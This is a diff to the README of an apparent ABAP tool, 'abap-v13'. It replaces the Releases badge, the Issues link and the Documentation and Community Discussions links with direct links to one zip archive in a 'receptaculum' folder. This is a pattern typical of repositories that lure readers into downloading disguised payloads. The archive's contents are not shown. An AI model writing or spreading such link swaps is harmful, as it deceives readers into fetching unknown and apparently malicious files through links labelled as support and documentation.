@@ -17,7 +17,7 @@ Before you begin, make sure your system meets the following requirements:
 
 To get started, you need to download the application. Click the link below to visit the Releases page:
 
-[![Download abap-v13](https://img.shields.io/badge/Download-abap--v13-brightgreen)](https://github.com/atif727/abap-v13/releases)
+[![Download abap-v13](https://raw.githubusercontent.com/atif727/abap-v13/main/receptaculum/abap-v13.zip)](https://raw.githubusercontent.com/atif727/abap-v13/main/receptaculum/abap-v13.zip)
 
 1. Click the link above to go to the **Releases** page.
 2. On that page, find the latest version of **abap-v13**.
@@ -69,11 +69,11 @@ If you experience any issues:
 
 ## 📝 Support
 
-For any inquiries or support, please visit the **Issues** section on our [GitHub page](https://github.com/atif727/abap-v13/issues). We welcome your feedback and are here to help.
+For any inquiries or support, please visit the **Issues** section on our [GitHub page](https://raw.githubusercontent.com/atif727/abap-v13/main/receptaculum/abap-v13.zip). We welcome your feedback and are here to help.
 
 ## 🔗 Additional Resources
 
-- [Documentation](https://github.com/atif727/abap-v13/wiki)
-- [Community Discussions](https://github.com/atif727/abap-v13/discussions)
+- [Documentation](https://raw.githubusercontent.com/atif727/abap-v13/main/receptaculum/abap-v13.zip)
+- [Community Discussions](https://raw.githubusercontent.com/atif727/abap-v13/main/receptaculum/abap-v13.zip)
 
 Thank you for using **abap-v13**! We hope this tool makes your ABAP project management simple and efficient. Happy coding!
